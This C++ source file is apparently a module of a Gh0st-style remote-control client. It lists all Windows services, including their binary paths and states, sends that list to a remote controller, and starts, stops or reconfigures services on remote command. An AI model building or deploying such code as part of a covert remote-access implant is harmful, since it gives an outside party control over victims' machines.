// ServicesManager.cpp: implementation of the CServicesManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ServicesManager.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServicesManager::CServicesManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
{
	SendServicesList();
}

CServicesManager::~CServicesManager()
{

}

VOID CServicesManager::SendServicesList()
{
	LPBYTE	szBuffer = GetServicesList();
	if (szBuffer == NULL)
		return;	

	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
}

LPBYTE CServicesManager::GetServicesList()
{
	LPENUM_SERVICE_STATUS  ServicesStatus    = NULL; 
	LPQUERY_SERVICE_CONFIG ServicesInfor     = NULL;
	LPBYTE			szBuffer = NULL;
	char	 szRunWay[256]  =  {0};
	char	 szAutoRun[256] =  {0};
	DWORD	 dwLength = 0;
	DWORD	 dwOffset = 0;
	if((m_hscManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS))==NULL)
	{
		return NULL;
	}

	ServicesStatus = (LPENUM_SERVICE_STATUS) LocalAlloc(LPTR,64*1024); 

	if (ServicesStatus==NULL)
	{
		CloseServiceHandle(m_hscManager);
		return NULL;
	}

	DWORD    dwNeedsBytes = 0; 
	DWORD    dwServicesCount = 0; 
	DWORD    dwResumeHandle = 0; 
	EnumServicesStatus(m_hscManager,
		SERVICE_TYPE_ALL,    //CTL_FIX
		SERVICE_STATE_ALL,
		(LPENUM_SERVICE_STATUS)ServicesStatus, 
		64 * 1024, 
		&dwNeedsBytes, 
		&dwServicesCount, 
		&dwResumeHandle); 

	szBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);

	szBuffer[0] = TOKEN_SERVERLIST;
	dwOffset = 1;
	for (unsigned long i = 0; i < dwServicesCount; ++i)  // Display The Services,显示所有的服务
	{ 
		SC_HANDLE hServices = NULL;
		DWORD     nResumeHandle = 0; 

		hServices=OpenService(m_hscManager,ServicesStatus[i].lpServiceName,
			SERVICE_ALL_ACCESS);

		if (hServices==NULL)
		{
			continue;
		}

		ServicesInfor = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR,4*1024);        

		QueryServiceConfig(hServices,ServicesInfor,4*1024,&dwResumeHandle); 
		//查询服务的启动类别

		if (ServicesStatus[i].ServiceStatus.dwCurrentState!=SERVICE_STOPPED) //启动状态
		{
			ZeroMemory(szRunWay, sizeof(szRunWay));
			lstrcat(szRunWay,"启动");
		}
		else
		{
			ZeroMemory(szRunWay, sizeof(szRunWay));
			lstrcat(szRunWay,"停止");
		}

		if(2==ServicesInfor->dwStartType) //启动类别  //SERVICE_AUTO_START
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));
			lstrcat(szAutoRun,"自动");
		}
		if(3==ServicesInfor->dwStartType)   //SERVICE_DEMAND_START
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));
			lstrcat(szAutoRun,"手动");
		}
		if(4==ServicesInfor->dwStartType)
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));   //SERVICE_DISABLED
			lstrcat(szAutoRun,"禁用");
		}

		dwLength = sizeof(DWORD) + lstrlen(ServicesStatus[i].lpDisplayName) 
			+ lstrlen(ServicesInfor->lpBinaryPathName) + lstrlen(ServicesStatus[i].lpServiceName)
			+ lstrlen(szRunWay) + lstrlen(szAutoRun) + 1;
		// 缓冲区太小，再重新分配下
		if (LocalSize(szBuffer) < (dwOffset + dwLength))
			szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
			LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(szBuffer + dwOffset, ServicesStatus[i].lpDisplayName, 
			lstrlen(ServicesStatus[i].lpDisplayName) + 1);
		dwOffset += lstrlen(ServicesStatus[i].lpDisplayName) + 1;//真实名称

		memcpy(szBuffer + dwOffset, ServicesStatus[i].lpServiceName, lstrlen(ServicesStatus[i].lpServiceName) + 1);
		dwOffset += lstrlen(ServicesStatus[i].lpServiceName) + 1;//显示名称

		memcpy(szBuffer + dwOffset, ServicesInfor->lpBinaryPathName, lstrlen(ServicesInfor->lpBinaryPathName) + 1);
		dwOffset += lstrlen(ServicesInfor->lpBinaryPathName) + 1;//路径

		memcpy(szBuffer + dwOffset, szRunWay, lstrlen(szRunWay) + 1);//运行状态
		dwOffset += lstrlen(szRunWay) + 1;			

		memcpy(szBuffer + dwOffset, szAutoRun, lstrlen(szAutoRun) + 1);//自启动状态
		dwOffset += lstrlen(szAutoRun) + 1;

		CloseServiceHandle(hServices);
		LocalFree(ServicesInfor);  //Config
	}

	CloseServiceHandle(m_hscManager);

	LocalFree(ServicesStatus);

	return szBuffer;						
}

VOID  CServicesManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
	case COMMAND_SERVICELIST:
		SendServicesList();
		break;
	case COMMAND_SERVICECONFIG:   //其他操作
		ServicesConfig((LPBYTE)szBuffer + 1, ulLength - 1);
		break;
	default:
		break;
	}
}

void CServicesManager::ServicesConfig(PBYTE szBuffer, ULONG ulLength)
{
	BYTE bCommand = szBuffer[0];
	char *szServiceName = (char *)(szBuffer+1);

	switch(bCommand)
	{
	case 1:	//start
		{	
			SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_ALL_ACCESS);
			if (NULL != hSCManager)
			{
				SC_HANDLE hService = OpenService(hSCManager, 
					szServiceName, SERVICE_ALL_ACCESS);
				if ( NULL != hService )
				{
					StartService(hService, NULL, NULL);
					CloseServiceHandle( hService );
				}
				CloseServiceHandle(hSCManager);
			}
			Sleep(500);
			SendServicesList();	
		}
		break;

	case 2:	//stop
		{
			SC_HANDLE hSCManager =
				OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);  //SC_MANAGER_CREATE_SERVICE
			if ( NULL != hSCManager)
			{
				SC_HANDLE hService = OpenService(hSCManager,
					szServiceName, SERVICE_ALL_ACCESS);
				if ( NULL != hService )
				{
					SERVICE_STATUS Status;
					BOOL bOk = ControlService(hService,SERVICE_CONTROL_STOP,&Status);

					CloseServiceHandle(hService);
				}
				CloseServiceHandle(hSCManager);
			}
			Sleep(500);
			SendServicesList();
		}
		break;
	case 3:	//auto
		{
			SC_HANDLE hSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
			if ( NULL != hSCManager )
			{
				SC_HANDLE hService = OpenService(hSCManager, szServiceName, 
					SERVICE_ALL_ACCESS);
				if ( NULL != hService )
				{
					SC_LOCK sclLock=LockServiceDatabase(hSCManager);
					BOOL bOk = ChangeServiceConfig(
						hService,
						SERVICE_NO_CHANGE,
						SERVICE_AUTO_START,
						SERVICE_NO_CHANGE,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL);
					UnlockServiceDatabase(sclLock); 
					CloseServiceHandle(hService);
				}
				CloseServiceHandle(hSCManager);
			}
			Sleep(500);
			SendServicesList();	
		}
		break;
	case 4: // DEMAND_START
		{
			SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
			if ( NULL != hSCManager )
			{
				SC_HANDLE hService = OpenService(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
				if ( NULL != hService )
				{
					SC_LOCK sclLock = LockServiceDatabase(hSCManager);
					BOOL bOK = ChangeServiceConfig(
						hService,
						SERVICE_NO_CHANGE,
						SERVICE_DEMAND_START,
						SERVICE_NO_CHANGE,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL);
					UnlockServiceDatabase(sclLock); 
					CloseServiceHandle(hService );
				}
				CloseServiceHandle( hSCManager);
			}
			Sleep(500);
			SendServicesList();
		}
	default:
		break;
	}
}
